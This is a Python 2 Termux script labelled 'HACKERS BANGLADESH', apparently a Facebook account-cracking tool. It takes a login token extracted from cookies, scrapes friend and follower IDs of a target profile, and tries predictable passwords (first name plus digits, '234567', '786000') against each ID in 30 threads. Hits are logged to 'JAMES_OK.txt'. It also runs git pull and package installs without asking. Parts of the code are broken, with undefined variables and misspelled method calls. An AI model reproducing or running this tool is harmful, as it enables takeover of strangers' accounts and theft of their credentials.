# DECRYPTED BY xXx_not_found_xXx
# Github : https://github.com/hamalord4444
 #!/usr/bin/python
# -*- coding: utf-8

try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass
os.system("clear")

"""
try:
    my = requests.get("https://mr.james404.byethost7.com")
except requests.exceptions.ConnectionError:
    print("")
    print("\t    \033[1;31mTurn on mobile data OR wifi\033[0;97m")
    print("")
    time.sleep(1)
    raw_input(" Press enter to try again ")
    os.system("python2 new.py")"""
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
    os.system("apt install ruby -y && gem install lolcat")
from requests.exceptions import ConnectionError
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/PROHACK-FILE/JJJJJ/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd JJJJJ && npm install")
    os.system("cd JJJJJ && node index.js &")
    os.system("clear")
    print("\033[1;32mPlease Select Chrome Browser To Continue\033[0;97m")
    os.system("xdg-open https://github.com/James404-cyber")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/PROHACK-FILE/JJJJJ/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd JJJJJ && node index.js &")
    os.system("clear")
    print("\033[1;32mPlease Select Chrome Browser To Continue\033[0;97m")
    os.system("xdg-open https://github.com/James404-cyber")
    time.sleep(10)
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"
os.system('git pull')
os.system('clear')
logo = """
\033[1;92m    _          _
\033[1;92m     \        /
\033[1;92m    __\______/__
\033[1;92m    | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |​
 \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+]
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m█
\033[1;92m╚═════════════════════════════════════════╝ """  

def log_menu():
    
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print '\033[1;31;1m~~~~ LOGIN MENU ~~~~'
        print ''
        print '\033[1;92m[1] Login With Fb'
        print '\033[1;92m[2] Login With Token'
        print '\033[1;92m[3] Login With Cookies'
        print ''
        log_menu_s()



def log_menu_s():
    s = raw_input(' \033[1;93mSelect One: ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mLogin with id/pass'
    print ''
    lid = raw_input('\033[1;92m Id/mail/no: ')
    pwds = raw_input(' \033[1;93mPassword: ')
    
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ''
            print ' User must verify account before login'
            print ''
            raw_input('\033[1;92m Press enter to try again ')
            log_fb()
        else:
            print ''
            print ' Id/Pass may be wrong'
            print ''
            raw_input(' \033[1;92mPress enter to try again ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')



def log_token():
    os.system('clear')
    print logo
    print ''
    print '\033[1;93mLogin with token'
    print ''
    tok = raw_input(' \033[1;92mPaste token here: ')
    print ''
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mLogin Cookies'
    print ''
    
    try:
        cookie = raw_input(' Paste cookies here: ')
        data = {
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36',
            'referer': 'https://m.facebook.com/',
            'host': 'm.facebook.com',
            'origin': 'https://m.facebook.com',
            'upgrade-insecure-requests': '1',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'text/html; charset=utf-8',
            'cookie': cookie }
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()

def menu():
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print ''
        print '\033[1;31;1mLogin FB id to continue'
        print ''
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Cheekpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \033[1;92mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    tok = open('/sdcard/.blk.txt', 'r').read()
    print 47 * '-'
    print ' \033[1;92mLoggin in user: ' + z
    print ''
    print ' \033[1;93mActive token: ' + tok
    print 47 * '-'
    print '\x1b[1;92m[1] Crack With Auto Pass '
    print '\x1b[1;92m[2] Crack With Number Pass '
    print '\x1b[1;92m[3] Crack With Name+Digit Pass'
    print '\x1b[1;92m[4] Crack With Name+Digit And Digit Pass'
    print '\x1b[1;92m[5] Creating File From Follower'
    print '\x1b[1;92m[6] Creating File From Public Friends'
    print '\x1b[1;92m[7] Logout'
    print '\x1b[1;92m[8] Remove Junk Files'
    menu_s()

def menu_s():
    ms = raw_input('\x1b[1;93mSelect One : ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
    elif ms == '3':
        name_crack()
    elif ms == '4':   
    	digit_crack()
    elif ms == '5':
        ex_id_flo()
    elif ms == '6':
        ex_id()
    elif ms == '7':
        lout()
    elif ms == '8':
        rtrash()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()

def crack():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;93m~~~~ AUTO PASS CRACKING ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    a_s()

def auto_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;93m~~~~ AUTO PASS CRACKING ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    a_s()

def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' Select One : ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m~~~~ AUTO PASS PUBLIC CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        idt = raw_input(' \x1b[1;93m[★]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;93m~~~~AUTO PASS PUBLIC CRACKING~~~~'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' \x1b[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m~~~~ AUTO PASS FOLLOWERS CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        idt = raw_input(' \x1b[1;93m[★]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;93m~~~~ AUTO PASS FOLLOWERS CRACKING ~~~~'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('\x1b[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;97m~~~~ AUTO PASS FILE CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        try:
            idlist = raw_input(' \x1b[1;96m[★] File Name:  ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        a_s()
    print ' \x1b[1;93mTotal ids: \x1b[1;96m ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;91mCrack Running\x1b[1;91m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92mWE ARE MAKING SYSTEM\x1b[1;91m'
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + '12345'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass1
                cp = open('JAMES_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass2
                    cp = open('JAMES_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '786'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass3
                        cp = open('JAMES_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '123'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass4
                            cp = open('JAMES_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = '234567'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass5
                                cp = open('JAMES_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                pass6 = '223344'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass6
                                    cp = open('JAMES_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    pass7 = '334455'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass7
                                        cp = open('JAMES_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        pass8 = '445566'
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass8
                                            cp = open('JAMES_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                            pass9 = '000786'
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass9
                                                cp = open('JAMES_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                pass10 = '786000'
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[JAMES-HACKED💉] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass10
                                                    cp = open('JAMES_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[1;92mCrack Done'
    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \x1b[1;93mPress enter to back')
    auto_crack()

def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;93m~~~~ NUMBER PASS CRACKING ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    c_s()


def choice_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~ Login FB id to continue ~~~'
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;93m~~~~ NUMBER PASS CRACKING ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    c_s()


def c_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;91mSelect One : ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m ~~~~ NUMBER PASS PUBLIC CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;91m For example:234567,223344,334455,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        idt = raw_input(' \x1b[1;93m[★5]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;93m ~~~~ NUMBER PASS PUBLIC CRACKING ~~~~'
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' Press enter to try again ')
            choice_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m~~~~ NUMBER PASS FOLLOWERS CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;91m For example:234567,223344,334455,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        idt = raw_input(' \x1b[1;93mEnter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print ''
            print '\x1b[1;93~~~~ NUMBER PASS FOLLOWERS CRACKING ~~~~'
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('Press enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print ''
        print '\x1b[1;93m ~~~~ NUMBER PASS FILE CRACKING ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;91m For example:234567,223344,334455,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        try:
            idlist = raw_input(' \x1b[1;96m[★] File Name:  ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack_b()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\t Choose valid option' + w
        c_s()
    print ' \x1b[1;93mTotal ids: \x1b[1;96m ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;91m~~~ Crack Running ~~~\x1b[1;91m'
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92mWE ARE MAKING SYSTEM\x1b[1;91m'
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[JAMES-HACKED 💉] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass1
                cp = open('JAMES_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JAMES-HACKED 💉] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass2
                    cp = open('JAMES_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JAMES-HACKED 💉] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass3
                        cp = open('JAMES_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JAMES-HACKED 💉] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass4
                            cp = open('JAMES_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[JAMES-HACKED 💉] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass5
                                cp = open('JAMES_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JAMES-HACKED 💉] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JAMES_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\033[1;31;1m[JAMES-CP] ' + uid + ' | ' + pass6
                                    cp = open('JAMES_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[1;92mCrack Done'
    print '\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input('\x1b[1;93m Press enter to back')
    choice_crack()

def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;93m~~~~ NAME + DIGIT PASS CRACKING ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
